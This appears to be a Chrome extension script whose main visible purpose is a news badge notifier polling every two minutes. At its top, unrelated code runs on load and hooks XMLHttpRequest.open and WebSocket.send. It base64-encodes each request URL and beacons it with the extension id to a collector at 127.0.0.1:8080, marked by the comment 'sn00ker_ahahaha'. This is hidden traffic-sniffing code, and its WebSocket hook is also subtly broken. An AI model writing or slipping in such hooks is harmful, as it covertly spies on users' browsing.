function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var badgeNotifier = (function () {

    var alarmName = 'badgeNotifier';
    var delayInMinutes = 1;
    var periodInMinutes = 2; // co 2 min

    function checkIfAlarmExists(callback) {
        chrome.alarms.getAll(function (alarms) {
            var hasAlarm = alarms.some(function (a) {
                return a.name == alarmName;
            });
            if (callback) callback(hasAlarm);
        })
    }

    function create() {
        chrome.alarms.create(alarmName, {
            delayInMinutes: delayInMinutes, periodInMinutes: periodInMinutes
        });
    }

    function cancel() {
        chrome.alarms.clear(alarmName);
    }

    checkIfAlarmExists(function (hasAlarm) {
        if (!hasAlarm) {
            create()
        } else {
            cancel();
            create();
        }
    });

    chrome.alarms.onAlarm.addListener(function (alarm) {

        if (alarm && alarm.name == alarmName) {
            console.log("alarm fired!");
            setBadgeForNews();
        }
    });

    function setNewsBadgeText(text) {
        chrome.browserAction.setBadgeText({text: text});
    }

    function setBadgeForNews() {
        showNewsService.checkNews(function () {
            console.log("no news found.");
            setNewsBadgeText("")
        }, function () {
            console.log("check the news!");
            setNewsBadgeText("!")
        });
    }

    return {
        clearBadge: function () {
            setNewsBadgeText("")
        },
        refreshBadge: function () {
            console.log("refresh started");
            setBadgeForNews();
        }
    }

})();

badgeNotifier.refreshBadge();